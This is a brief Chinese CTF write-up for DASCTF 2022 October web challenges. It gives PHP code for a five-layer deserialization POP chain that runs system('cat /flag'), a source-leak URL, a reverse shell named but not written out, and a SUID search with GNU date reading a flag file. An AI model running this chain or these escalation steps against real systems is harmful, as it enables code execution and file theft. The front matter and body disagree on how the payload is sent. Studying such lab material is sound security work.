---
title: DASCTF 2022 十月赛 Web 部分 Writeup
contest: DASCTF
year: 2022
difficulty: easy
vuln_type: deserialize
tags: [php, pop-chain, fine-show-sorry, file-read, suid-date, bash-reverse]
attack_chain:
  - 构造 sorry → show → secret_code → sorry → fine POP 链
  - fine.cmd = system
  - fine.content = 'cat /flag'
  - serialize 后 base64 POST pop
  - /file.php?m=show&filename=file.php 读源
  - bash -i 反弹 shell
  - find / -perm -u=s -type f
  - date -f /hereisflag/flllll111aaagg
key_payload: 5 层 POP 链 + system 触发
one_liner: DASCTF 2022 十月赛 Web 入门题集，5 层 PHP 反序列化 POP + file.php 源码泄露 + SUID 提权。
lesson: PHP 反序列化 POP 链构造的关键是"找到包含可调用方法的对象作为下一个对象的属性"。
quality: medium
---

DASCTF 2022 十月赛 Web 入门题集（来源 ctfiot 转存）。

**easy_pop — 5 层反序列化链**

4 个类：
- `fine { cmd, content }`
- `show { ctf, time }`
- `sorry { name, password, hint, key }`
- `secret_code { code }`

POP 链构造：

```php
$e = new fine();
$e->cmd = 'system';
$e->content = 'cat /flag';

$d = new sorry();
$d->key = $e;            // sorry.key = fine

$c = new secret_code();
$c->code = $d;            // secret_code.code = sorry

$b = new show();
$b->ctf = $c;            // show.ctf = secret_code

$a = new sorry();
$a->name = '123';
$a->password = '123';
$a->hint = $b;            // sorry.hint = show

echo serialize($a);
```

最终反序列化时通过 `__destruct/__wakeup` 链依次触发 `fine.__call`/其他魔术方法，最终调用 `system(cat /flag)`。

GET `?pop=...` 一把梭。

**file.php 源码泄露**

`/file.php?m=show&filename=file.php` 直接读源，验证反序列化 POP 链。

**提权**

反弹 shell 后：
- `find / -perm -u=s -type f 2>/dev/null` 找 SUID 二进制
- `date -f /hereisflag/flllll111aaagg` 利用 GNU date 的 `-f` 读文件做提权触发
